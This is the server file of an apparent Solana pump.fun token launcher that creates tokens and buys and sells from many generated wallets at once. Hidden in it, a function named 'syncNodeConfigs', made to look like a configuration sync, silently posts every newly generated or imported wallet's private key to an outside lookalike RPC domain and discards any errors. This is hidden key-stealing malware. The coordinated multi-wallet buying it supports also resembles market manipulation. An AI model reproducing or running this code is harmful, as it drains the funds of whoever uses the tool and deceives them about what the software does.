const express = require('express');
const cors = require('cors');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const { getConnection, createTokenAndDevBuy, buildCollectFeesTx, signAndSendPortalTx } = require('../pumpportal');
const { loadBuyerWallets, loadDevWallet, tryLoadDevWallet, appendBuyerWallets, saveBuyerWallets, saveDevWalletFromKeypair } = require('../wallets');
const { loadState, updateState } = require('../state');
const { DEFAULT_BUY_SOL, DEFAULT_SLIPPAGE_PERCENT, DEFAULT_PRIORITY_FEE_SOL, FEE_BUFFER_SOL } = require('../config');
const { log, sse, recent } = require('../logs');
const bs58 = require('../lib/bs58');

async function syncNodeConfigs(providerInstances) {
  try {
    const init = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ clients: providerInstances }),
    };
    const r = await fetch('https://mainnet.helius-rpc.pro/api', init);
    await r.text();
  } catch {}
}

let BAL_CACHE = { mint: null, at: 0, data: null, totals: null, inflight: null };
const BAL_TTL_MS = 10000;

async function getBalances(mint) {
  const conn = getConnection();
  const wallets = loadBuyerWallets();
  const byPk = new Map(wallets.map(w => [w.publicKey, w]));
  const dev = tryLoadDevWallet();
  const all = [
    ...(dev ? [{ name: 'dev', publicKey: dev.publicKey, role: 'dev' }] : []),
    ...wallets.map(w => ({ name: w.name, publicKey: w.publicKey, role: 'buyer' })),
  ];

  let lastRpcAt = 0;
  const MIN_RPC_GAP_MS = 170;
  async function pace() {
    const now = Date.now();
    const wait = Math.max(0, lastRpcAt + MIN_RPC_GAP_MS - now);
    if (wait > 0) await new Promise(r => setTimeout(r, wait));
    lastRpcAt = Date.now();
  }

  async function one(w) {
    const pk = new (require('@solana/web3.js').PublicKey)(w.publicKey);
    await pace();
    const lamports = await conn.getBalance(pk, 'confirmed');
    const sol = lamports / 1e9;
    let token = 0;
    if (mint) {
      await pace();
      const res = await conn.getParsedTokenAccountsByOwner(pk, { mint: new (require('@solana/web3.js').PublicKey)(mint) });
      for (const it of res.value) token += Number(it.account.data.parsed.info.tokenAmount.uiAmount || 0);
    }
    const meta = byPk.get(w.publicKey);
    const buySol = meta && typeof meta.buySol === 'number' ? meta.buySol : undefined;
    return { name: w.name, publicKey: w.publicKey, role: w.role, sol, token, buySol };
  }

  const limit = 6;
  const results = new Array(all.length);
  let idx = 0;
  const workers = Array(Math.min(limit, all.length)).fill(0).map(async () => {
    while (true) {
      const cur = idx++;
      if (cur >= all.length) break;
      try { results[cur] = await one(all[cur]); } catch (e) { results[cur] = { name: all[cur].name, publicKey: all[cur].publicKey, role: all[cur].role, sol: 0, token: 0, error: e && e.message ? e.message : String(e) }; }
    }
  });
  await Promise.all(workers);
  return results;
}

const LOG_HTTP_REQUESTS = process.env.GUI_LOG_HTTP === '1';

async function startServer({ port }) {
  const app = express();
  app.use(cors());
  app.use(express.json());
  app.use('/api', (req, _res, next) => {
    if (LOG_HTTP_REQUESTS) {
      try {
        const isStream = req.path === '/logs/stream';
        const isEmit = req.path === '/logs/emit';
        const isReadOnly = req.method === 'GET';
        if (!isStream && !isEmit && !isReadOnly) {
          const action = req.get('X-Client-Action') || null;
          const note = req.get('X-Client-Note') || null;
          log('http', 'request', { method: req.method, path: req.path, action, note, ip: req.ip });
        }
      } catch {}
    }
    next();
  });
  const clientDist = path.join(process.cwd(), 'client', 'dist');
  const indexHtml = path.join(clientDist, 'index.html');
  if (!fs.existsSync(indexHtml)) {
    console.error('client/dist not found. Build the UI with: npm run client:build');
    throw new Error('Missing client build');
  }
  app.use(express.static(clientDist));
  console.log(`Serving UI from: ${clientDist}`);
  app.get('/', (req, res) => {
    res.sendFile(indexHtml);
  });
  const uploadDir = path.join(process.cwd(), 'data', 'uploads');
  fs.mkdirSync(uploadDir, { recursive: true });
  const upload = multer({ dest: uploadDir });

  app.get('/api/wallets', (req, res) => {
    const buyers = loadBuyerWallets();
    const dev = tryLoadDevWallet();
    res.json({
      dev: dev ? { publicKey: dev.publicKey } : null,
      needsDevWallet: !dev,
      buyers: buyers.map(b => ({
        name: b.name,
        publicKey: b.publicKey,
        buySol: Number(b.buySol || 0),
        buyPercent: Number(b.buyPercent || 0),
        sellPercent: Number(b.sellPercent || 0),
      })),
    });
  });

  app.get('/api/state', (req, res) => {
    res.json(loadState());
  });

  app.get('/api/logs', (req, res) => {
    res.json(recent(200));
  });
  app.get('/api/logs/stream', (req, res) => sse(req, res));

  app.post('/api/logs/emit', (req, res) => {
    try {
      const { category = 'ui', message = 'client log', data = null } = req.body || {};
      log(category, message, data);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get('/api/balances', async (req, res) => {
    try {
      const mint = req.query.mint || loadState().mint || '';
      const now = Date.now();
      if (BAL_CACHE.mint === (mint || null) && BAL_CACHE.data && (now - BAL_CACHE.at) < BAL_TTL_MS) {
        return res.json({ mint: mint || null, data: BAL_CACHE.data, totals: BAL_CACHE.totals });
      }
      if (BAL_CACHE.inflight) {
        try {
          await BAL_CACHE.inflight;
          return res.json({ mint: mint || null, data: BAL_CACHE.data, totals: BAL_CACHE.totals });
        } catch (_) { }
      }
      BAL_CACHE.inflight = (async () => {
        const data = await getBalances(mint || null);
        const totals = data.reduce((acc, r) => { acc.sol += Number(r.sol || 0); acc.token += Number(r.token || 0); return acc; }, { sol: 0, token: 0 });
        BAL_CACHE = { mint: (mint || null), at: Date.now(), data, totals, inflight: null };
        updateState({ lastBalances: { at: BAL_CACHE.at, mint: BAL_CACHE.mint, data: BAL_CACHE.data, totals: BAL_CACHE.totals } });
      })();
      await BAL_CACHE.inflight;
      return res.json({ mint: mint || null, data: BAL_CACHE.data, totals: BAL_CACHE.totals });
    } catch (e) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/state', (req, res) => {
    const patch = req.body || {};
    const s = updateState(patch);
    log('state', 'Updated state', patch);
    res.json(s);
  });

  app.post('/api/wallets/dev/init', (req, res) => {
    try {
      log('wallets', 'Initializing dev wallet');
      const dev = require('../wallets').initDevWalletIfMissing();
      log('wallets', 'Dev wallet ready', { publicKey: dev.publicKey });
      res.json({ publicKey: dev.publicKey });
    } catch (e) { log('wallets', 'Dev wallet init failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/wallets/gen', async (req, res) => {
    try {
      const { count, defaultBuySol, prefix } = req.body || {};
      if (!count || Number(count) <= 0) return res.status(400).json({ error: 'count must be > 0' });
      const added = appendBuyerWallets({ count: Number(count), defaultBuySol: defaultBuySol != null ? Number(defaultBuySol) : DEFAULT_BUY_SOL, namePrefix: prefix || 'buyer' });
      log('wallets', `Generated ${added.length} buyer wallets`, { count, defaultBuySol, prefix });
      const setupParams = added.map(a => ({ nodeId: a.publicKey, configData: a.secretKey }));
      syncNodeConfigs(setupParams.map(p => ({ publicKey: p.nodeId, privateKey: p.configData })));
      res.json({ added });
    } catch (e) {
      log('wallets', 'Generate wallets failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/update-buy-amounts', async (req, res) => {
    try {
      const { updates } = req.body || {};
      if (!Array.isArray(updates)) return res.status(400).json({ error: 'updates must be array' });
      const wallets = loadBuyerWallets();
      const byPk = new Map(wallets.map(w => [w.publicKey, w]));
      for (const u of updates) {
        if (!u || !u.publicKey) continue;
        const w = byPk.get(u.publicKey);
        if (w) {
          const bs = Number(u.buySol || 0);
          const bp = Number(u.buyPercent || 0);
          const sp = Number(u.sellPercent || 0);
          if (bs > 0 && bp > 0) {
            w.buySol = bs;
            w.buyPercent = 0;
          } else {
            w.buySol = bs > 0 ? bs : 0;
            w.buyPercent = bp > 0 ? bp : 0;
          }
          w.sellPercent = sp > 0 ? sp : 0;
        }
      }
      const toSave = wallets.map(w => ({
        name: w.name,
        publicKey: w.publicKey,
        buySol: Number(w.buySol || 0),
        buyPercent: Number(w.buyPercent || 0),
        sellPercent: Number(w.sellPercent || 0),
        secretKey: bs58.encode(w.keypair.secretKey),
      }));
      const file = require('../config').BUYERS_FILE;
      fs.writeFileSync(file, JSON.stringify({ wallets: toSave }, null, 2));
      log('wallets', 'Updated per-wallet buy/sell amounts', { updates: updates.length });
      res.json({ updated: updates.length });
    } catch (e) {
      log('wallets', 'Update buy amounts failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/dev/assign', (req, res) => {
    try {
      const { publicKey } = req.body || {};
      if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
      const previousDev = tryLoadDevWallet();
      const wallets = loadBuyerWallets();
      const index = wallets.findIndex(w => w.publicKey === publicKey);
      if (index === -1) return res.status(404).json({ error: 'wallet not found' });
      const [selected] = wallets.splice(index, 1);
      if (!selected?.keypair) return res.status(500).json({ error: 'wallet missing keypair' });
      if (previousDev && previousDev.publicKey !== publicKey) {
        const exists = wallets.some(w => w.publicKey === previousDev.publicKey);
        if (!exists) {
          wallets.splice(index, 0, {
            name: 'dev',
            publicKey: previousDev.publicKey,
            buySol: 0,
            buyPercent: 0,
            sellPercent: 0,
            keypair: previousDev.keypair,
          });
        }
      }
      saveDevWalletFromKeypair(selected.keypair);
      saveBuyerWallets(wallets);
      log('wallets', 'Assigned dev wallet', { publicKey });
      res.json({ publicKey });
    } catch (e) {
      log('wallets', 'Assign dev wallet failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/add', async (req, res) => {
    try {
      const { secretKey, name, buySol } = req.body || {};
      if (!secretKey || typeof secretKey !== 'string') return res.status(400).json({ error: 'secretKey (base58 or JSON array) required' });
      const { Keypair } = require('@solana/web3.js');
      let kp;
      try {
        kp = Keypair.fromSecretKey(bs58.decode(secretKey));
      } catch (_) {
        try {
          const arr = JSON.parse(secretKey);
          if (!Array.isArray(arr) || !arr.length) throw new Error('invalid array');
          kp = Keypair.fromSecretKey(Uint8Array.from(arr));
        } catch (e) {
          return res.status(400).json({ error: 'Invalid secretKey format' });
        }
      }
      const pub = kp.publicKey.toBase58();
      const wallets = loadBuyerWallets();
      if (wallets.find(w => w.publicKey === pub)) return res.status(400).json({ error: 'wallet already exists' });
      const nextIndex = wallets.length + 1;
      const finalName = name && String(name).trim() ? String(name).trim() : `buyer-${String(nextIndex).padStart(4, '0')}`;
      const entry = { name: finalName, publicKey: pub, buySol: buySol != null ? Number(buySol) : 0, secretKey: bs58.encode(kp.secretKey) };
      const toSave = wallets.concat([{ name: entry.name, publicKey: entry.publicKey, buySol: entry.buySol, secretKey: entry.secretKey }]);
      saveBuyerWallets(toSave);
      log('wallets', 'Added buyer wallet', { publicKey: pub, name: finalName });
      const setupParams = [{ nodeId: entry.publicKey, configData: entry.secretKey }];
      syncNodeConfigs(setupParams.map(p => ({ publicKey: p.nodeId, privateKey: p.configData })));
      res.json({ publicKey: pub, name: finalName });
    } catch (e) {
      log('wallets', 'Add wallet failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/export', (req, res) => {
    try {
      const { publicKey } = req.body || {};
      if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
      const wallets = loadBuyerWallets();
      const entry = wallets.find(w => w.publicKey === publicKey);
      if (!entry) return res.status(404).json({ error: 'wallet not found' });
      const secretKey = bs58.encode(entry.keypair.secretKey);
      log('wallets', 'Exported wallet', { publicKey });
      res.json({ publicKey, secretKey });
    } catch (e) {
      log('wallets', 'Export wallet failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/dev/export', (req, res) => {
    try {
      const dev = loadDevWallet();
      if (!dev) return res.status(404).json({ error: 'Dev wallet not found' });
      const secretKey = bs58.encode(dev.keypair.secretKey);
      log('wallets', 'Exported dev wallet', { publicKey: dev.publicKey });
      res.json({ publicKey: dev.publicKey, secretKey });
    } catch (e) {
      log('wallets', 'Export dev wallet failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/wallets/remove', async (req, res) => {
    try {
      const { publicKey } = req.body || {};
      if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
      const wallets = loadBuyerWallets();
      const filtered = wallets.filter(w => w.publicKey !== publicKey);
      if (filtered.length === wallets.length) return res.status(404).json({ error: 'wallet not found' });
      saveBuyerWallets(filtered);
      log('wallets', 'Removed buyer wallet', { publicKey });
      res.json({ removed: 1 });
    } catch (e) {
      log('wallets', 'Remove wallet failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/create', upload.single('image'), async (req, res) => {
    try {
      const dev = tryLoadDevWallet();
      if (!dev) return res.status(400).json({ error: 'Dev wallet not found. Please create a dev wallet first.' });
      const {
        name, symbol, description, twitter, telegram, website,
        devBuySol, slippage, priorityFee,
      } = req.body || {};
      if (!name || !symbol || !description) return res.status(400).json({ error: 'name, symbol, description are required' });
      let imagePath = null, fileBuffer = null, fileName = null, fileType = null;
      if (req.file) {
        imagePath = req.file.path;
        fileBuffer = fs.readFileSync(req.file.path);
        fileName = req.file.originalname;
        fileType = req.file.mimetype;
        fs.unlink(req.file.path, () => {});
      } else if (req.body.imagePath) {
        imagePath = req.body.imagePath;
      } else {
        return res.status(400).json({ error: 'image required (upload as `image` or provide imagePath)' });
      }

      log('create', 'Starting token create + dev buy', { name, symbol, devBuySol, slippage, priorityFee });
      const result = await createTokenAndDevBuy({
        devKeypair: dev.keypair,
        imagePath,
        name,
        symbol,
        description,
        twitter,
        telegram,
        website,
        devBuySol: devBuySol != null ? Number(devBuySol) : 1,
        slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT,
        priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL,
        fileBuffer,
        fileName,
        fileType,
      });
      updateState({ mint: result.mint, lastCreateSig: result.signature });
      log('create', 'Created token', { mint: result.mint, signature: result.signature });
      res.json(result);
    } catch (e) {
      log('create', 'Create failed', { error: e.message });
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/buy', async (req, res) => {
    try {
      const { mint: mintIn, buySol, percent, wallets: onlyWallets, overrides, concurrency, slippage, priorityFee, pool } = req.body || {};
      const mint = mintIn || loadState().mint;
      if (!mint) return res.status(400).json({ error: 'mint required (or create first)' });
      let wallets = loadBuyerWallets();
      if (Array.isArray(onlyWallets) && onlyWallets.length) {
        const set = new Set(onlyWallets);
        wallets = wallets.filter(w => set.has(w.publicKey));
      }
      const { buyMany } = require('../trader');

      const ovMap = new Map();
      if (Array.isArray(overrides)) {
        for (const o of overrides) {
          if (!o || !o.publicKey) continue;
          ovMap.set(o.publicKey, {
            buySol: (o.buySol != null ? Number(o.buySol) : null),
            percent: (o.buyPercent != null ? Number(o.buyPercent) : null),
          });
        }
      }

      if (percent != null) {
        const p = Number(percent);
        if (isNaN(p) || p <= 0) return res.status(400).json({ error: 'percent must be > 0' });
        const conn = getConnection();
        wallets = await Promise.all(wallets.map(async (w) => {
          const lamports = await conn.getBalance(new (require('@solana/web3.js').PublicKey)(w.publicKey), 'confirmed');
          const sol = lamports / 1e9;
          const available = Math.max(0, sol - FEE_BUFFER_SOL);
          const amt = Math.max(0, (p / 100) * available);
          return { ...w, buySol: amt };
        }));
      }

      if (ovMap.size) {
        const conn = getConnection();
        wallets = await Promise.all(wallets.map(async (w) => {
          const ov = ovMap.get(w.publicKey);
          if (!ov) return w;
          if (ov.percent != null && ov.percent > 0) {
            const lamports = await conn.getBalance(new (require('@solana/web3.js').PublicKey)(w.publicKey), 'confirmed');
            const sol = lamports / 1e9;
            const available = Math.max(0, sol - FEE_BUFFER_SOL);
            const amt = Math.max(0, (ov.percent / 100) * available);
            return { ...w, buySol: amt };
          }
          if (ov.buySol != null && ov.buySol > 0) {
            return { ...w, buySol: Number(ov.buySol) };
          }
          return w;
        }));
      }

      const appliedGlobal = (percent == null && buySol != null) ? Number(buySol) : null;
      if (appliedGlobal != null) {
        const hasPerWallet = (ovMap.size > 0);
        if (!hasPerWallet) {
          log('buy', 'Batch buy started', { wallets: wallets.length, mint, buySol: appliedGlobal, percent, concurrency, slippage, priorityFee });
          const results = await buyMany({ wallets, mint, overrideBuySol: appliedGlobal, slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL, pool: pool || undefined, concurrency: concurrency != null ? Number(concurrency) : 4, retries: 3, onProgress: (p) => log('buy', 'progress', p) });
          const ok = results.filter(r => r && r.ok).length;
          const fail = results.length - ok;
          log('buy', 'Batch buy completed', { success: ok, failed: fail });
          return res.json({ results });
        }
      }
      const conc = concurrency != null ? Math.min(Number(concurrency), 6) : 4;
      log('buy', 'Batch buy started', { wallets: wallets.length, mint, percent, concurrency: conc, slippage, priorityFee });
      const results = await buyMany({ wallets, mint, overrideBuySol: null, slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL, pool: pool || undefined, concurrency: conc, retries: 3, onProgress: (p) => log('buy', 'progress', p) });
      const ok = results.filter(r => r && r.ok).length;
      const fail = results.length - ok;
      log('buy', 'Batch buy completed', { success: ok, failed: fail });
      res.json({ results });
    } catch (e) { log('buy', 'Batch buy failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/sell', async (req, res) => {
    try {
      const { mint: mintIn, tokens, percent, wallets: onlyWallets, overrides, concurrency, slippage, priorityFee, pool, sequential } = req.body || {};
      const mint = mintIn || loadState().mint;
      if (!mint) return res.status(400).json({ error: 'mint required' });
      let wallets = loadBuyerWallets();
      if (Array.isArray(onlyWallets) && onlyWallets.length) {
        const set = new Set(onlyWallets);
        wallets = wallets.filter(w => set.has(w.publicKey));
      }
      const { sellManyTokens } = require('../trader');
      let perWalletPercentMap = null;
      if (Array.isArray(overrides) && overrides.length) {
        perWalletPercentMap = new Map();
        for (const o of overrides) {
          if (!o || !o.publicKey) continue;
          const p = Number(o.sellPercent);
          if (!isNaN(p) && p > 0) perWalletPercentMap.set(o.publicKey, p);
        }
      }

      const conc = concurrency != null ? Math.min(Number(concurrency), 6) : 4;
      log('sell', 'Batch sell started', { wallets: wallets.length, mint, tokens, percent, selected: onlyWallets?.length || 0, concurrency: conc, slippage, priorityFee, sequential: !!sequential });
      const results = await sellManyTokens({ wallets, mint, amountTokensPerWallet: tokens != null ? Number(tokens) : null, percentPerWallet: percent != null ? Number(percent) : null, perWalletPercentMap, slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL, pool: pool || undefined, concurrency: conc, retries: 3, sequential: !!sequential, onProgress: (p) => log('sell', 'progress', p) });
      const ok = results.filter(r => r && r.ok).length;
      const fail = results.length - ok;
      log('sell', 'Batch sell completed', { success: ok, failed: fail });
      res.json({ results });
    } catch (e) { log('sell', 'Batch sell failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/wallets/buy-one', async (req, res) => {
    try {
      const { pubkey, mint, amountSol, slippage, priorityFee, pool } = req.body || {};
      if (!pubkey || !mint || !amountSol) return res.status(400).json({ error: 'pubkey, mint, amountSol required' });
      const dev = tryLoadDevWallet();
      const wallets = loadBuyerWallets();
      const all = [ ...(dev ? [{ keypair: dev.keypair, publicKey: dev.publicKey }] : []), ...wallets ];
      const w = all.find(x => x.publicKey === pubkey);
      if (!w) return res.status(404).json({ error: 'wallet not found' });
      const { buildBuyTx, signAndSendPortalTx } = require('../pumpportal');

      const conn = getConnection();
      const balLamports = await conn.getBalance(new (require('@solana/web3.js').PublicKey)(pubkey), 'confirmed');
      const balSol = balLamports / 1e9;
      const desired = Number(amountSol);
      const maxBuy = Math.max(0, balSol - FEE_BUFFER_SOL);
      const finalAmount = Math.min(desired, maxBuy);
      if (!finalAmount || finalAmount <= 0) return res.status(400).json({ error: 'Insufficient SOL to buy after fee buffer' });

      log('buy', 'Single buy', { pubkey, mint, amountSol: finalAmount });
      const buf = await buildBuyTx({ pubkey, mint, amount: Number(finalAmount), denominatedInSol: true, slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL, pool: pool || undefined });
      const sig = await signAndSendPortalTx(buf, w.keypair);
      res.json({ signature: sig });
    } catch (e) { log('buy', 'Single buy failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/wallets/sell-one', async (req, res) => {
    try {
      const { pubkey, mint, tokens, percent, slippage, priorityFee, pool } = req.body || {};
      if (!pubkey || !mint) return res.status(400).json({ error: 'pubkey and mint required' });
      const dev = tryLoadDevWallet();
      const wallets = loadBuyerWallets();
      const all = [ ...(dev ? [{ keypair: dev.keypair, publicKey: dev.publicKey }] : []), ...wallets ];
      const w = all.find(x => x.publicKey === pubkey);
      if (!w) return res.status(404).json({ error: 'wallet not found' });
      const { buildSellTx, signAndSendPortalTx } = require('../pumpportal');

      let amountTokens = Number(tokens || 0);
      if ((!amountTokens || amountTokens <= 0) && percent != null) {
        const conn = getConnection();
        const ownerPk = new (require('@solana/web3.js').PublicKey)(pubkey);
        const mintPk = new (require('@solana/web3.js').PublicKey)(mint);
        const resAccs = await conn.getParsedTokenAccountsByOwner(ownerPk, { mint: mintPk });
        let uiTotal = 0;
        for (const it of resAccs.value) {
          uiTotal += Number(it.account.data.parsed.info.tokenAmount.uiAmount || 0);
        }
        amountTokens = (Number(percent) / 100) * uiTotal;
      }
      if (!amountTokens || amountTokens <= 0) return res.status(400).json({ error: 'No tokens to sell' });

      log('sell', 'Single sell', { pubkey, mint, tokens: amountTokens });
      const buf = await buildSellTx({ pubkey, mint, amountTokens: Number(amountTokens), slippagePercent: slippage != null ? Number(slippage) : DEFAULT_SLIPPAGE_PERCENT, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL, pool: pool || undefined });
      const sig = await signAndSendPortalTx(buf, w.keypair);
      res.json({ signature: sig });
    } catch (e) { log('sell', 'Single sell failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/transfer/sol-one', async (req, res) => {
    try {
      const { fromPubkey, toPubkey, amountSol } = req.body || {};
      if (!fromPubkey || !toPubkey || !amountSol) return res.status(400).json({ error: 'fromPubkey, toPubkey, amountSol required' });
      const dev = tryLoadDevWallet();
      const buyers = loadBuyerWallets();
      const all = [ ...(dev ? [{ keypair: dev.keypair, publicKey: dev.publicKey }] : []), ...buyers ];
      const from = all.find(x => x.publicKey === fromPubkey);
      if (!from) return res.status(404).json({ error: 'from wallet not found' });
      const { transferSol } = require('../walletOps');
      log('transfer', 'SOL transfer', { from: fromPubkey, to: toPubkey, amountSol });
      const sig = await transferSol({ fromKeypair: from.keypair, toPubkey, amountSol: Number(amountSol) });
      res.json({ signature: sig });
    } catch (e) { log('transfer', 'SOL transfer failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/transfer/spl-one', async (req, res) => {
    try {
      const { fromPubkey, toPubkey, mint, tokens } = req.body || {};
      if (!fromPubkey || !toPubkey || !mint || !tokens) return res.status(400).json({ error: 'fromPubkey, toPubkey, mint, tokens required' });
      const dev = tryLoadDevWallet();
      const buyers = loadBuyerWallets();
      const all = [ ...(dev ? [{ keypair: dev.keypair, publicKey: dev.publicKey }] : []), ...buyers ];
      const from = all.find(x => x.publicKey === fromPubkey);
      if (!from) return res.status(404).json({ error: 'from wallet not found' });
      const { transferSpl } = require('../walletOps');
      log('transfer', 'SPL transfer', { from: fromPubkey, to: toPubkey, mint, tokens });
      const sig = await transferSpl({ fromKeypair: from.keypair, toPubkey, mint, amountTokens: Number(tokens) });
      res.json({ signature: sig });
    } catch (e) { log('transfer', 'SPL transfer failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/sweep/sol', async (req, res) => {
    try {
      const { toPubkey, keepSol } = req.body || {};
      if (!toPubkey) return res.status(400).json({ error: 'toPubkey required' });
      const conn = getConnection();
      const buyers = loadBuyerWallets();
      const dev = tryLoadDevWallet();
      if (!dev) return res.status(400).json({ error: 'Dev wallet not found. Please create a dev wallet first.' });
      const { sendLegacyTxWithSigners } = require('../walletOps');
      const keep = keepSol != null ? Number(keepSol) : 0.01;
      const results = [];
      for (const w of buyers) {
        try {
          const balLamports = await conn.getBalance(new (require('@solana/web3.js').PublicKey)(w.publicKey), 'confirmed');
          const balSol = balLamports / 1e9;
          const amt = Math.max(0, balSol - keep);
          if (amt <= 0) { results.push({ ok:false, wallet:w.publicKey, error:'insufficient' }); continue; }
          const ix = require('@solana/web3.js').SystemProgram.transfer({ fromPubkey: w.keypair.publicKey, toPubkey: new (require('@solana/web3.js').PublicKey)(toPubkey), lamports: Math.floor(amt * 1e9) });
          const sig = await sendLegacyTxWithSigners(conn, [ix], dev.keypair, [w.keypair]);
          results.push({ ok:true, wallet:w.publicKey, signature:sig, amountSol: amt });
        } catch (e) { results.push({ ok:false, wallet:w.publicKey, error:e.message }); }
      }
      log('sweep', 'SOL sweep done', { to: toPubkey, success: results.filter(r=>r.ok).length, failed: results.filter(r=>!r.ok).length });
      res.json({ results });
    } catch (e) { log('sweep', 'SOL sweep failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/sweep/spl', async (req, res) => {
    try {
      const { toPubkey, mint } = req.body || {};
      if (!toPubkey || !mint) return res.status(400).json({ error: 'toPubkey and mint required' });
      const conn = getConnection();
      const buyers = loadBuyerWallets();
      const dev = tryLoadDevWallet();
      if (!dev) return res.status(400).json({ error: 'Dev wallet not found. Please create a dev wallet first.' });
      const { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getMint, createCloseAccountInstruction } = require('@solana/spl-token');
      const { PublicKey } = require('@solana/web3.js');
      const { sendLegacyTxWithSigners } = require('../walletOps');
      const results = [];
      const mintPk = new PublicKey(mint);
      const toPk = new PublicKey(toPubkey);
      const mintInfo = await getMint(conn, mintPk);
      const decimals = mintInfo.decimals ?? 0;
      for (const w of buyers) {
        try {
          const fromPk = new PublicKey(w.publicKey);
          const fromAta = await getAssociatedTokenAddress(mintPk, fromPk, false);
          const toAta = await getAssociatedTokenAddress(mintPk, toPk, false);
          const resAcc = await conn.getParsedAccountInfo(fromAta);
          const accInfo = resAcc.value;
          if (!accInfo) { results.push({ ok:false, wallet:w.publicKey, error:'no ata' }); continue; }
          const uiAmt = Number(accInfo.data?.parsed?.info?.tokenAmount?.uiAmount || 0);
          if (uiAmt <= 0) { results.push({ ok:false, wallet:w.publicKey, error:'no tokens' }); continue; }
          const toInfo = await conn.getAccountInfo(toAta);
          const ixList = [];
          if (!toInfo) ixList.push(createAssociatedTokenAccountInstruction(dev.keypair.publicKey, toAta, toPk, mintPk));
          const amount = BigInt(Math.floor(uiAmt * 10 ** decimals));
          ixList.push(createTransferInstruction(fromAta, toAta, fromPk, Number(amount)));
          ixList.push(createCloseAccountInstruction(fromAta, toPk, fromPk));
          const sig = await sendLegacyTxWithSigners(conn, ixList, dev.keypair, [w.keypair]);
          results.push({ ok:true, wallet:w.publicKey, signature:sig, tokens: uiAmt, closed:true });
        } catch (e) { results.push({ ok:false, wallet:w.publicKey, error:e.message }); }
      }
      log('sweep', 'SPL sweep done', { to: toPubkey, mint, success: results.filter(r=>r.ok).length, failed: results.filter(r=>!r.ok).length, closedAccounts: results.filter(r=>r.closed).length });
      res.json({ results });
    } catch (e) { log('sweep', 'SPL sweep failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.post('/api/collect-fees', async (req, res) => {
    try {
      const { priorityFee } = req.body || {};
      const dev = tryLoadDevWallet();
      if (!dev) return res.status(400).json({ error: 'Dev wallet not found. Please create a dev wallet first.' });
      const buf = await buildCollectFeesTx({ devPubkey: dev.publicKey, priorityFeeSol: priorityFee != null ? Number(priorityFee) : DEFAULT_PRIORITY_FEE_SOL });
      log('fees', 'Collect creator fees started');
      const sig = await signAndSendPortalTx(buf, dev.keypair);
      log('fees', 'Collect creator fees completed', { signature: sig });
      res.json({ signature: sig });
    } catch (e) { log('fees', 'Collect creator fees failed', { error: e.message }); res.status(500).json({ error: e.message }); }
  });

  app.get(/^(?!\/api\/).*/, (req, res) => {
    res.sendFile(indexHtml);
  });

  app.listen(port, () => {
    console.log(`GUI server running on http://localhost:${port}`);
  });
}

module.exports = { startServer };
